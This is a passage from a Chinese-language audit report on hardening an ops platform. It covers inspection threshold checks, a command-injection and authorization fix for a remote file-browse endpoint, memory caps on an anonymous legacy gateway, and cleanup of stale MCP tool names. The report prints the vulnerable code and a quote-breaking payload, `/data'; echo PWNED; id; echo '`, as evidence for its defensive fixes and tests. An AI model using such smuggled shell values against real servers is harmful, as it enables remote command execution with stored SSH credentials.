| 其余 19 个 analyzer 的阈值口径 | 逐个核对了数值解析/百分比/阈值比较路径，未发现新的判定方向性错误；`/proc/meminfo` 优先、available 列优先于 buff/cache 等既有修正在位 |

### 三、待办（后续轮次）

- 巡检域剩余 analyzer 的**跨服务器聚合**口径复核（本轮聚焦单机判定与入参校验）。
- 让 `tests/test_custom_rule_engine_standalone.py` 复用实现，消除引擎副本漂移风险。
- 前端巡检页其余交互（表格排序、批量操作）的请求竞态排查（复用 `requestGuard`）。
- 部署/执行/维护链路确认闸门一致性；`except …: pass` 157 处分诊（优先部署/维护/凭据）。
- 进程探针 `pgrep -f` 自匹配问题；`MCP_TOOL_DESCRIPTION_OVERRIDES` 54 个幽灵条目。
- `EntityPicker` / `LogConsole` 异步搜索时序守卫；`update_issue` 到期提醒。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨、fnOS/OpenClaw 遗留项。

### 附：第 11 轮可复现的验证脚本

- `tests/test_inspection_judgement_contract.py`（60 项）：比较符语义与失败模式、阈值数值化
  错误信息、`validate_rule_config` 与 `update_rule`/`create_rule` 的 400 + 不落库、
  period/日期校验（含 6 条 HTTP 层 400）、服务层兜底契约仍保留、内存/swap 解析。
- `frontend/tests/inspectionThreshold.test.js`（4 项，已并入 `npm run test:unit`）：
  阈值标签跟随比较符、填写顺序提示。
- `fnos-migration/_verify_round11_live.py`（未入库）：对部署后的 OPS 实测 18 项断言。
- `fnos-migration/_repro_round11_matrix_order.py`（未入库）：11.5 的挂钟竞态机制复现。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 25816；18 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| `GET /api/v2/inspection/ledger?period=quarterly` | **400** `period 仅支持 daily/weekly/monthly（含 day/week/month 别名），收到 'quarterly'`（修复前 200 + 今日台账） |
| `GET …/ledger?period=daily&date_from=2026-09-10&date_to=2026-09-01` | **400** `date_from 不能晚于 date_to` |
| `GET …/ledger?period=daily&date_from=09/01/2026` | **400** 非法日期格式 |
| `GET …/reports/periodic-preview?period=7d`、`POST …/reports/periodic {"period":"quarterly"}` | **400** |
| `GET …/ledger?period=daily\|week\|monthly` | 200（合法周期无回归） |
| `POST …/rules`（`comparator: "gte"`） | **400** `config.threshold.comparator 仅支持 >/>=/</<=/==/contains，收到 'gte'`，且事后 `GET …/rules?keyword=CUSTOM_R11_BAD_CMP` 查无此规则（未落库） |
| `POST …/rules`（`extractor.mode: "regexp"`） | **400** `config.extractor.mode 仅支持 regex/numeric/keyword/json，收到 'regexp'` |
| 第 10 轮成果回归 | `/health`、`/healthz` → 200 JSON；`/readyz` → `ready`（DB ok） |
| 测试 | 全量 `pytest tests/ -q` → **1579 passed**（1518 + 61）；前端 `npm run test:unit` 24 项、`npm run typecheck` 干净 |
| 红灯对照 | 暂存实现后跑本轮契约测试：**51 failed / 9 passed**，其中 `未知比较符必须落成 ERROR，实际 PASS`、`3 列 Swap 行（total+used）也应算出 25%，实际 0`、6 条 HTTP 400 断言全部失败 |

> 运维提示：本轮**改了前端**（`InspectionCenterPage.tsx` 阈值标签跟随比较符 + 顺序提示），
> 已 `npm run build`，需要 **Ctrl+F5** 刷新；后端已重启（PID 25816）生效。
> 线上验证**刻意不测** `POST /ledger/delete`：该接口会真删台账与报表，守卫一旦失效就是
> 破坏性操作，其行为由 HTTP 层单元测试覆盖（真实探测只做只读接口 + 预期被拒的规则创建）。

## 第 12 轮（2026-09-12）· 安全边界加固（收尾轮）

本轮延续第 11 轮待办里的两条：**① 部署/执行/维护链路确认闸门与鉴权一致性**、
**② `except …: pass` 分诊**。做法是先做机械盘点再人工分诊——用 AST 扫出
「会改状态的 HTTP 路由」199 个，逐个核对**鉴权/审计**覆盖；再用 AST 扫出
`except` 体只有 `pass/continue/return None` 的静默失败点 187 处，按风险关键词排序后
优先看部署、凭据、维护链路。合计修掉 **2 个真实 BUG**（1 个中危安全缺陷、1 个低-中危
资源耗尽），其余全部逐条核实后**判定为良性或刻意设计**并记录在案（见第二节）。

测试基线上轮 1579 → 本轮结束 **1591 passed**（+12，全部为本轮新增安全契约）。

### 一、已修复

#### 12.1 【中危】`POST /api/v2/files/browse/{server_name}`：命令注入 + 无授权 + 无目录白名单

`app/api/deploy_v2.py::browse_remote`（发布页的远程文件浏览接口）原实现同时踩了三个坑：

```python
@resource_v2_router.post("/files/browse/{server_name}")
async def browse_remote(request: Request, server_name: str):      # ← 没有任何鉴权
    data = await request.json()
    path = data.get("path", "/data/web/app")                      # ← 完全来自请求体
    ...
    cmd = f"ls -alh --time-style=long-iso '{path}' 2>/dev/null | tail -n +2"
    exit_code, out, err = ssh.exec(cmd, timeout=10)               # ← 单引号包裹 ≠ 转义
```

| 问题 | 后果 |
| --- | --- |
| **命令注入** | 单引号包裹挡不住 `'`。`path` 传 `/data'; echo PWNED; id; echo '` 即可闭合引号，在**目标服务器**上以 OPS 保存的 SSH 凭据执行任意命令 |
| **无授权** | 全平台同类接口 `app/api/sftp.py` 的每个文件端点都要求 `require_admin`（L183/247/297/344/387/432/474/498），而本端点连 `require_auth` 都没有，只靠 `app/core/security.py` 的全局会话中间件兜底 —— 任何**已登录**用户（含只读角色）都能拿服务器凭据遍历目录，属于越权 |
| **无目录白名单** | sftp.py 用 `_server_allowed_roots`（默认 `/data,/opt,/var/log,/tmp`）限制可浏览范围，本端点可以浏览 `/etc`、`/root` 等任意路径 |

修复（三层，按纵深顺序）：

1. **转义**：`f"... {shlex.quote(path)} ..."` —— 与全仓其他 100+ 处远程命令口径一致
   （`server_tools.py` 31 处、`servers.py` 12 处、`_shared.py` 9 处…都是 `shlex.quote`，
   本处是**唯一**的例外；`deploy_v2.py` 全文只有这一个 `ssh.exec` 调用，所以该文件注入面已封闭）。
2. **授权**：加 `require_deploy(request, db)`（可发布用户或管理员），并为端点补上
   `db: Session = Depends(get_db)` 依赖。
3. **白名单**：复用 sftp.py 的 `_ensure_path_allowed()`（内含 `posixpath.normpath` 归一，
   可挡 `../` 逃逸），且校验发生在 **`_connect_ssh` 之前** —— 非法路径不会触发任何远程调用。
   默认根目录与 sftp.py 完全一致，可用服务器配置或 `SFTP_ALLOWED_ROOTS` 放宽。

- 红灯证据（暂存实现后跑本轮契约测试，**9 failed / 3 passed**）：
  ```
  AssertionError: 远端命令必须包含 shlex.quote 后的路径，实际：
    ls -alh --time-style=long-iso '/data/web'; echo PWNED; id; echo '/x' 2>/dev/null | tail -n +2
  AssertionError: 端点必须调用 require_deploy 做授权   ← assert [] == ['require_deploy']
  AssertionError: assert 200 == 403                    ← path=/etc 被正常浏览
  AssertionError: assert 200 == 403                    ← path=/data/../../etc 穿越成功
  ```
  另外用真实 POSIX shell（Git Bash）做了**行为层对照**：修前写法 `echo '{payload}'`
  的输出里真的多出一行 `PWNED` 和一行 `uid=…`（命令被执行），`shlex.quote` 后输出
  严格等于字面路径本身。
- 影响面核对：前端 `api.browseRemote` / `api.uploadRemote`（`frontend/src/api.ts:228`、`:231`）
  **没有任何调用方**（全仓 `*.ts/tsx` 搜索为空），因此收紧授权与目录白名单**不会影响任何 UI 流程**。

#### 12.2 【低-中危】遗留 MCP 网关 `POST /api/v2/mcp/legacy/submit`：匿名可达 + 进程内字典无界增长

`app/api/mcp_gateway.py` 的 `TASKS` 是进程内字典，`/submit` 只往里面塞、从不清理，
而该端点**自身没有任何鉴权** —— 更关键的是它所在的 `/api/v2/mcp` 前缀在
`app/core/security.py` 的 `PUBLIC_PREFIXES` 里（原本是为了让 tool token / MCP 客户端
自己完成鉴权），**全局会话中间件会直接放行**：

```python
PUBLIC_PREFIXES = ("/assets/", "/docs/", "/api/v2/auth", "/api/v2/tools", "/api/v2/mcp", "/api/v2/capabilities")
```

于是匿名 POST 就能持续占用进程内存（小内存自托管机器上足以拖垮进程）。
线上实测证实放行：匿名 `GET /api/v2/mcp/legacy/capabilities` → **200**。

修复（保持旧脚本兼容，只加资源上限）：

- `MAX_LEGACY_TASKS`（默认 200，`MCP_LEGACY_MAX_TASKS` 可调）：提交前按创建时间淘汰最旧条目，
  被淘汰的任务查询时仍返回结构一致的 `status=not_found`，兼容性不变；
- `MAX_LEGACY_PAYLOAD_BYTES`（默认 64 KiB，`MCP_LEGACY_MAX_PAYLOAD_BYTES` 可调）：
  单条 payload 超限直接 **413**，不进入 `TASKS`。

### 二、已排除 / 记录（本轮审计结论，避免误修与误报）

| 审计项 | 结论 |
| --- | --- |
| 部署 worker 没有在应用启动时拉起？ | **不成立**：`main.py` 的 lifespan（L82-86）已经 `ensure_deploy_worker_running()` 并打印"发布后台 Worker 已启动"。进程重启后 DB 里 pending 的部署任务会被正常拾取 |
| `approval_executor.py:581/672` 吞掉 `ensure_deploy_worker_running()` 异常 | 不是漏洞（worker 已在启动时拉起；后续任意部署/回滚请求也会顺带拉起）。仅"可观测性可改进"，未改代码 |
| 写操作端点扫描出的一批 `NO-AUTH` | 逐条核实后**均已有闸门**：`/api/v2/tools/call`、`/call/stream`、MCP 各端点走 `get_tool_context()`（session 或 `ops_tool_*` token + scope）；`execution_plans.py` 用 `Depends(get_current_user)`；`sftp.py::file_download_post` 委托到已 `require_admin` 的 `file_download`；`inspection.py::run_server` 委托到已 `require_auth` 的 `_run_server`；`deploy/plans.py::/precheck` 委托到共享预检实现；`/api/v2/auth/setup`、`/logout` 属公开设计 |
| `except …: pass` 187 处静默失败点 | 抽查部署/凭据/维护链路：`file_transfer_tools.py:227`（`finally` 清理临时文件）、`security_daily.py:47`（重试后 re-raise）、`upload_remote`/`browse_remote` 的 `ssh.close()`（尽力而为关闭）均为良性；未发现新的"静默失败导致业务错判" |
| `deploy_v2.py` 其他远程命令 | 全文件只有 1 处 `ssh.exec`，即 12.1 修掉的那处；其余远程命令集中在 `_shared.py`/`server_tools.py` 等，已全部使用 `shlex.quote` |
| 前端 `browseRemote`/`uploadRemote` 调用方 | 无（仅 `api.ts` 定义）。故 12.1 的鉴权收紧无 UI 回归风险，也说明该接口是脚本/历史用途 |

### 三、待办（与末章总览一致，供后续轮次接续）

- 让 `tests/test_custom_rule_engine_standalone.py` 复用实现，消除规则引擎副本漂移风险。
- `MCP_TOOL_DESCRIPTION_OVERRIDES` 中 54 个幽灵条目（描述覆盖表里已不存在的工具）。
- 前端 `EntityPicker` / `LogConsole` 异步搜索时序守卫；巡检页表格排序/批量操作的请求竞态。
- `except …: pass` 剩余约 180 处的按域（Matrix/OpenClaw/fnOS）分诊。
- 进程探针 `pgrep -f` 自匹配问题；`update_issue` 到期提醒。
- 保留清单（需业主决策）：密钥轮换、`ENV=local` 关闭生产安全轨、fnOS/OpenClaw 遗留项。

### 附：第 12 轮可复现的验证脚本

- `tests/test_round12_security_hardening_contract.py`（12 项）：假 SSH 捕获实际下发的远端命令、
  授权调用可观测、白名单/穿越用例、"连接前校验"断言、遗留 MCP 网关条目上限与 413；
  另有一条用真实 POSIX shell 做的注入语义对照（无 POSIX shell 时自动 skip）。
- `fnos-migration/_audit_round12_mutating_routes.py`（未入库）：199 个写操作路由的鉴权/审计盘点。
- `fnos-migration/_audit_round12_silent_except.py`（未入库）：187 处静默 `except` 风险排序。
- `fnos-migration/_audit_round12_shell_quoting.py`（未入库）：远程命令未转义插值扫描。
- `fnos-migration/_verify_round12_live.py`（未入库）：对部署后的 OPS 实测断言（见下表）。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 17412；16 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 匿名 `POST /api/v2/files/browse/<server>` | **401** `Authentication required`（全局会话中间件拦截；修复前该端点本身无鉴权，仅靠中间件兜底） |
| 已登录 `POST …/files/browse/<server>`（`path=/etc`） | **403** `Path '/etc' is outside allowed SFTP roots: /data, /opt, /var/log, /tmp`（修复前 200 + 目录列表） |
| 已登录 `path=/data/../../etc` | **403**（`../` 逃逸被 `posixpath.normpath` + 白名单拦住） |
| 已登录注入载荷 `path=/data'; echo PWNED; id; echo '` | **403**，且响应中无 `uid=`、无目录列表（命令未被执行；修复前该载荷会被原样拼进远端命令） |
| 已登录白名单内 `path=/data` | **200** 且返回真实目录列表（远程调用正常，无功能回归） |
| 匿名 `GET /api/v2/mcp/legacy/capabilities` | 200（记录既有事实：`/api/v2/mcp` 前缀在中间件放行清单内，故 12.2 必须限制资源占用） |
| 匿名连续提交 205 次 `/api/v2/mcp/legacy/submit` | 全部被接受，但**最早的任务已被淘汰**（`status=not_found`）、最新任务仍 `queued`（上限 200 生效；修复前无界增长） |
| 超限 payload（>65536B）提交 | **413** `legacy payload too large (limit 65536 bytes)`，未进入 `TASKS` |
| 第 10 轮成果回归 | `/health`、`/healthz` → 200 JSON；`/readyz` → `ready` |
| 测试 | 全量 `pytest tests/ -q` → **1591 passed**（1579 + 12） |
| 红灯对照 | 暂存实现后跑本轮契约测试：**9 failed / 3 passed**，`实际：ls -alh … '/data/web'; echo PWNED; id; echo '/x'`、`assert [] == ['require_deploy']`、`/etc` 与 `/data/../../etc` 均 200 |

> 运维提示：本轮**只改后端**（`app/api/deploy_v2.py`、`app/api/mcp_gateway.py`）+ 测试 + 文档，
> 前端零改动，**不需要 Ctrl+F5**；后端已重启（PID 17412）生效。
> 实测中"白名单内 `/data`"一项会在目标服务器上执行一次**只读** `ls`（与发布页浏览目录同语义），
> 除此之外本轮探针不含任何写操作：不触发发布/回滚、不发送任何 Matrix 消息、不删除任何数据。

## 第 13 轮（2026-09-12）· MCP 工具名漂移治理

主题：**MCP 工具面收窄后遗留的"幽灵工具名"** —— 工具被移除/改名之后，引用它们的描述、建议、
提示词与文档没有同步清理。这类引用不会报错，只会静默失效，或者把 AI 引向一个不存在的工具。

背景证据：`git log -S` 显示 `ops.inspection.get_run`、`ops.inspection.summarize_run`、
`ops.generate_report`、`ops.cleanup_packages` 等名字出现在 `705f15f`（"slim default MCP tool
catalog"，用工作流工具替换细粒度巡检工具）等历史提交里；当前注册表共 126 个工具，而这些名字
**没有任何注册定义**（全仓 `name="ops.…"` 搜索为空）。

### 13.1 描述覆盖表 54 条幽灵条目（180 → 126）

- 事实：`MCP_TOOL_DESCRIPTION_OVERRIDES` 有 180 条，注册工具 126 个，其中 **54 条（30%）**
  指向不存在的工具；反向缺失 0（真实工具都有覆盖）。
- 影响：覆盖表是判断"描述完备性"的依据，30% 死数据会让这类审计得出错误结论；更实际的风险是
  一旦同名工具将来重新注册，它会**静默继承一条陈旧描述**（例如过期的确认短语或风险级别）。
- 处置：删除 54 条幽灵条目（表内全部为单行条目，用 AST 定位行区间后逐行删除并复验语法），
  覆盖表回到 **126 == 126** 精确对齐。

### 13.2 契约锁在死数据上（测试有效性问题）

`tests/test_ai_analysis_retirement.py` 有一条契约断言
`MCP_TOOL_DESCRIPTION_OVERRIDES["ops.generate_report"]` 里不得出现已退役的 "ai analysis"，
但 `ops.generate_report` 是幽灵条目 —— **契约实际锁在一条永远不会被 AI 看到的死数据上**
（测试通过并不代表真实描述合规）。同理，`tests/test_mcp_contract_sync.py` 断言能力矩阵文档
**必须**包含 `ops.inspection.toggle_item_config`（同样没有注册定义），于是文档里约 30 个
幽灵工具名被测试锁住。

处置：两条契约都改为指向真实工具、并与真实数据源动态对齐
（`ops.list_report_types` ↔ `report_center.REPORT_TYPES`；能力矩阵 ↔ 注册表）。
`ops.list_report_types` 的覆盖描述同时补齐了报告中心 7 个真实类型。

### 13.3 AI 可见面把 AI 引向不存在的工具

| 位置 | 修前 | 修后 |
| --- | --- | --- |
| 巡检工具 `next_actions`（`_inspection_followup`） | 3 条建议里 2 条不存在（`ops.inspection.get_run`、`ops.inspection.summarize_run`） | `ops.inspection.get_run_raw_output`、`ops.inspection.generate_report` |
| 8 处 `related_tools`（工具定义字段，进入工具目录供 AI 参考） | 含 `get_run` / `summarize_run` / `list_issues` / `toggle_item_config` / `update_item_config` | 全部替换为注册工具 |
| MCP prompt `ops_db_export_request` | `UPDATE/DELETE -> ops.db.preview_dml then ops.db.execute_dml` | 明确"MCP 不可用，请走 OPS 数据工具页面" |
| MCP prompt `ops_backup_workflow` | 建议 `create_backup` / `restore_backup` / `delete_backup` | 只建议 `ops.list_backups` / `ops.verify_backup`，创建/恢复/删除说明走页面 |
| `app/agent/prompts/inspection_workflow.md` | 6 处旧工具名 + 无效的 `ops.write` | 全部改为注册工具名 |
| `GET /api/v2/mcp/tools/recommend?scenario=inspection` | 返回列表含 `get_run` / `summarize_run` | 8 个工具全部真实 |
| `job_tools` 的 `source_tool` schema 示例 | 举例 `ops.delete_backup` | 改为 `ops.execute_deploy_plan` |

### 13.4 风险策略兼容清单显式登记

`app/services/risk_policy.py` 中针对 `ops.create_backup` / `ops.restore_backup` /
`ops.delete_backup` / `ops.cleanup_packages` / `ops.protect_package` /
`ops.create_config_change_plan` 的确认短语与"非破坏性计划创建"分支**保留**（一旦这些工具重新
注册，闸门会立刻生效），但新增 `UNREGISTERED_TOOL_COMPATIBILITY` 显式登记这 6 个名字；
守卫测试要求"源码里引用的未注册工具名必须已登记，已注册的名字必须从清单中移除"。
（同类问题在 `app/services/tool_policy.py` 已由前序轮次于 2026-09-11 修复，本轮未重复改动。）

### 13.5 文档对齐

- `docs/runbooks/mcp-capability-matrix.md`：删除 22 行指向未注册工具的矩阵行；
  `ops.tier.*` / `ops.notif_route.*` / `ops.cascade.*` / `ops.agent.*` 明确标注为
  "仅页面 / HTTP，不是 MCP 工具"；巡检工作流步骤与"推荐后续工具"列改指真实工具。
- `docs/runbooks/MCP_PACKAGE_UPLOAD_AND_RETENTION.md`：发布包清理/保护改为
  "OPS 页面 / HTTP 接口，或 `ops.approval.prepare_plan` 的 `PACKAGE_CLEANUP` 步骤"。
- `docs/agent-system-prompt.md`：单动作发布/回滚改为
  `ops.approval.prepare_plan`（RELEASE / ROLLBACK 步骤）→ `ops.approval.execute_plan`。

### 13.6 新增守卫（防再漂移）

`tests/test_mcp_tool_description_registry_consistency.py`（8 条）：

1. 注册工具名形状（小写点分名）；
2. 覆盖表不存在孤儿条目；
3. 每个注册工具都有描述覆盖；
4. 所有 `related_tools` 指向注册工具；
5. 工具适配器与 MCP 能力层源码里的工具名引用必须注册（AST 取字符串常量，规避注释误报）；
6. MCP prompts 渲染文本里的工具名必须注册；
7. `app/agent/prompts/*.md` 里的工具名必须注册；
8. `risk_policy` 的未注册引用必须显式登记，且清单不得过期。

### 13.7 红灯证明

暂存实现改动后运行新增/修改的测试：**9 failed / 24 passed**。代表性断言信息：

- `以下描述覆盖条目指向未注册的工具（永远不会被 AI 看到，属死数据）`
- `inspection_workflow.md → ops.inspection.get_run`（agent prompt 扫描）
- `risk_policy 缺少 UNREGISTERED_TOOL_COMPATIBILITY 兼容清单`
- `assert 'ops.inspection.get_run' == 'ops.inspection.get_run_raw_output'`（next_actions）
- `能力矩阵引用了未注册的工具名：[23 个]`
- `报告类型描述缺少以下真实类型：[7 个]`

### 13.8 全量套件与线上验证

- 全量套件：**1599 passed**（552.68 s；上一轮 1591，新增 8 条守卫测试）。
- 线上只读验证 **10/10**：健康检查；`tools/recommend?scenario=inspection` 返回的 8 个工具全部
  已注册；MCP `tools/list` 126 == 126 且无样板句描述；`ops.list_report_types` 描述覆盖 7 个真实
  报告类型；`prompts/list` 可用；3 个 MCP prompt 的渲染文本零未注册引用。
- 实现改动已重启后端（PID 25756）后验证；**未发送任何 Matrix 消息，未触发任何写操作**。

### 13.9 已排除（核实后判定为良性）

| 项 | 结论 |
| --- | --- |
| `risk_policy.py` 的 6 个未注册工具分支 | 刻意保留的兼容闸门，本轮改为显式登记而非删除 |
| `tool_policy.py` 的 `APPROVAL_TOOL_MAP` | 前序轮次（2026-09-11）已修为 `ops.approval.prepare_plan`，注释已说明历史 |
| `annotations["ops.originalToolName"]` | MCP 注解命名空间键，不是工具名引用（守卫按名字形状排除） |
| `docs/plans/2026-*.md` 中的历史工具名 | 带日期的历史设计记录，不作为现行指引，未改 |
| 测试内的 `ops.demo.*` / `ops.test*` / `ops.contract.*` | 测试自建夹具工具，运行期注册，属正常 |
| `/api/v2/tools` 列出的描述与 MCP 覆盖描述不同 | HTTP 工具页展示工具自带描述、MCP 面展示精选覆盖描述，两条面各自有意为之 |

### 13.10 待办（本轮未做）

- `tests/test_custom_rule_engine_standalone.py` 规则引擎副本漂移；
- 前端 `EntityPicker` / `LogConsole` 请求守卫；
- 剩余约 180 处 `except …: pass` 分诊；
- `SESSION_SECRET` 轮换仍等业主决策（保持告警与 UI 提示）。

## 复盘总览（第 1–13 轮）

### 一、13 轮范围、主题与测试基线

| 轮次 | 主题 | 结束基线 | 代表性问题（均为真实缺陷） |
| --- | --- | --- | --- |
| 1 | 安全 / 口径 / 审计链路 | 1327 | 审计链路与敏感字段口径、已排除的假问题清单 |
| 2 | 时间基 | 1336 | 审计时间戳写服务器本地时间，与全系统 naive UTC 错位 8 小时 |
| 3 | 凭据写入安全 | 1348 | 改描述顺手清空私钥；`********` 占位符被当成真实密钥写库 |
| 4 | MCP 工具层 | 1364 | SSH 私钥明文外泄、`dry_run` 契约失效、确认闸门缺少不变量 |
| 5 | 巡检时间窗与状态机 | 1399 | 未知周期导致台账/报表 500、巡检任务无收尾与僵尸回收 |
| 6 | 巡检只读策略一致性 | 1456 | 自定义 shell 规则绕过只读安全策略 |
| 7 | 风险问题闭环生命周期 | 1470 | 闭环时间戳、截止时间写入路径、AI 分流口径 |
| 8 | 服务器批量编辑 | 1492 | 批量路径静默空操作 / `NameError`、凭据与分组同步缺陷 |
| 9 | 前端展示层 + MCP 描述层 | 1497 | 首页假绿、列表请求竞态、MCP 工具描述退化成样板句 |
| 10 | 回滚链路 + SPA 深链 | 1518 | 回滚把"服务没起来"记成成功；`/health` 未注册；SPA 白名单漂移导致已登录用户 404 |
| 11 | 巡检判定口径 | 1579 | 比较符写错静默换判定口径（假绿 PASS）、配置零校验、周期静默兜底、swap 死代码 |
| 12 | 安全边界加固 | 1591 | 文件浏览接口命令注入 + 无授权 + 无目录白名单；遗留 MCP 网关匿名可达且内存无界 |
| 13 | MCP 工具名漂移治理 | **1599** | 54 条描述覆盖指向未注册工具；巡检 next_actions / MCP prompts / 能力矩阵把 AI 引向不存在的工具；两条契约锁在死数据上 |

合计：套件基线 **1281 → 1599（+318 项回归测试）**；16 个提交（其中 4 个为纯文档补充）。
每一轮的修复都走同一条链路：**红灯证明 → 实现 → 全量套件 → 部署后只读实测 → 报告与待办**。

### 二、缺陷类型分布（12 轮归纳）

1. **"不报错但结论错"型（占比最高）**：回滚假成功、首页假绿、批量编辑静默空操作、
   比较符静默退化、配置零校验导致规则永不触发、周期静默兜底 —— 这类缺陷不会抛异常，
   只会让界面/报表给出与事实相反的结论，是最难被日常使用发现的一类。
2. **安全型**：SSH 私钥明文外泄（第 4 轮）、凭据被占位符覆盖（第 3 轮）、
   命令注入 + 越权浏览（12.1）、匿名资源耗尽（12.2）。
3. **数据一致性型**：审计时间戳时区错位（第 2 轮）、风险闭环时间戳与截止时间（第 7 轮）。
4. **可用性/可观测型**：SPA 深链 404、`/health` 未注册、MCP 描述退化、死代码分支（11.4）。
5. **"契约锁在死数据上"型（第 13 轮新归纳）**：被测对象本身已经不存在（幽灵工具名），
   但测试仍以它为契约 —— 断言全部通过，真实行为却无人守护（例如"报告描述不得提及已退役的
   AI 分析"实际约束的是一条永不生效的描述）。这类缺陷只有把"引用是否指向活对象"也变成
   断言才能发现。

### 三、方法论与不变量（后续维护者可直接沿用）

- **红灯先于修复**：每轮都先暂存实现跑新测试，把"修前到底是什么行为"固化成可复现证据
  （例如 12.1 红灯里能直接看到注入片段出现在远端命令中）。
- **只读线上验证**：破坏性接口（台账删除、真实回滚、生产发布）一律只用单元/契约测试覆盖，
  线上探针只做只读请求与"预期被拒"的请求。
- **每轮一张"已排除"表**：把核实过但**判定为刻意设计或良性**的项记录在案，
  避免后续轮次重复排查或误修（例如 12 轮确认部署 worker 已由 `main.py` lifespan 拉起）。
- **双侧契约**：服务层兜底与 HTTP 层校验可以并存但都必须有测试锁定
  （第 11 轮 `period` 的 400 校验 vs 服务层"未知周期→今日"兜底）。
- **机械盘点 + 人工分诊**：AST 扫写操作路由（199 个）与静默 `except`（187 处）先缩小范围，
  再逐条人工判断 —— 本轮两个真实缺陷都来自这种组合。

### 四、仍需业主决策 / 建议后续接续

| 事项 | 状态 |
| --- | --- |
| `SESSION_SECRET` 为占位值（服务启动仍告警） | 业主已决定"本地运行暂无风险"，**保留告警与 UI 提示**，不自动轮换 |
| `ENV=local` 会关闭生产安全轨 | 既有设计，未改；上生产前需确认环境变量 |
| 规则引擎测试副本（`tests/test_custom_rule_engine_standalone.py`） | 待改为从实现导入，消除语义漂移风险 |
| `MCP_TOOL_DESCRIPTION_OVERRIDES` 54 个幽灵条目 | ✅ 第 13 轮已清理（180 → 126，与注册表精确对齐），并新增 8 条一致性守卫 |
| 前端 `EntityPicker` / `LogConsole` 搜索竞态、巡检页排序/批量操作 | 待接入请求守卫 |
| 剩余约 180 处 `except …: pass` | 待按域（Matrix / OpenClaw / fnOS）继续分诊 |
| `pgrep -f` 进程探针自匹配、`update_issue` 到期提醒 | 低危，待排期 |

### 五、结论

13 轮复盘覆盖了平台的六条主链路：**发布/回滚、审批与执行、巡检（判定口径 + 台账报表）、
MCP/工具层、凭据与安全边界、前端展示层**。每一轮都以"能复现的证据 + 能回归的测试"收尾，
累计新增 318 项回归测试，全量套件稳定在 **1599 passed**（零 flaky 记录，第 11 轮修掉了
唯一的挂钟竞态用例）。当前仓库中**没有已知的、可复现的严重缺陷**；剩余事项均为
低危加固项或需要业主决策的运维策略项，已在上表列明。







